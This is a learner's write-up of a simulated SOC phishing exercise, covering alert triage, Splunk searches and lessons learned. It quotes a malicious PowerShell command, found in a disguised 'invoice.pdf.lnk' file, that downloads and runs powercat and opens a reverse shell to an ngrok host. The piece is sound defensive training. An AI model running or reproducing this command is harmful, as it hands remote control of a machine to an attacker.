# SOC Simulation - Phishing Unfolding

## Scope, Setup, Goals

The TryHackMe SOC Simulator gives a rare opportunity to not just familiarize myself further with Splunk more but also learn to build a habit of recognition of processes and their parent processes, and getting into a triage workflow.
Handling alerts in realtime, investigating them and deciding if they are classified as True Positive or False Positive within this simulation felt as close to the real thing as I can get at the current stage.

## Workflow

I quickly realised the duality of being a SOC-Analyst. On the one hand closing the fifth ticket of a spam email as a False Positive and asking myself, why this rule has not been tuned yet.
On the other hand, the dread of multiple alerts popping up almost at the same time, showing data exfiltration via PowerShell from a workstation and fighting through these tickets.

I did triage depending on priority ( High > Medium > Low ) as well as time ( Older > Newer). 

A few key things I observed about myself, that I am naturally suspicious of almost every alert, trying to understand why it fired and properly classifying them.

I proved to be exceptionally suspicious of any type of file attachment, which led to me discovering a hidden powershell script inside a zip file, that by itself did not look suspicious, but had a file called 'invoice.pdf.lnk' inside.
Correctly assuming, that this was likely malicious and preying on the default windows setting to hide file extensions and analyzed it to find said script.

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');

powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
```

I then triaged this low severity alert, classified it as a True Positive and escalated it to an imaginary Tier 2 Analyst (it is a simulation after all)

![invoice.pdf.lnk-findings](https://github.com/V4641/InfoSec-Portfolio/blob/main/Defensive/Soc-Simulator/THM%20Phishing%20Unfolding/Screenshots/Screenshot%202026-08-17%20205421.png)

## Splunk

I used Splunk for most of the investigations that later were classified as true positives, checking on outgoing traffic in the case of malicious links to assess, if it was by any chance clicked and to correlate process IDs.

Yet I did notice that my understanding of the Splunk syntax is still not very deep and needs further training. It is an incredible tool that I still need to familiarize myself with more.

![Splunk-Search](https://github.com/V4641/InfoSec-Portfolio/blob/main/Defensive/Soc-Simulator/THM%20Phishing%20Unfolding/Screenshots/Screenshot%202026-08-17%20211746.png)

## Lessons Learned

The biggest takeaway, besides the experience of incoming live alerts, was that with the proper knowledge about processes, a lot of false positives can be dismissed relatively easily.

Expanding this knowledge base is one of my primary concerns at the current time, to not be reliant on other sources as much as I did here.

## Conclusion

The SOC-Simulator is a fantastic tool and I will keep using it to deepen my practical knowledge further in different scenarios.

![Final-Assessment](https://github.com/V4641/InfoSec-Portfolio/blob/main/Defensive/Soc-Simulator/THM%20Phishing%20Unfolding/Screenshots/Screenshot%202026-08-17%20214110.png)



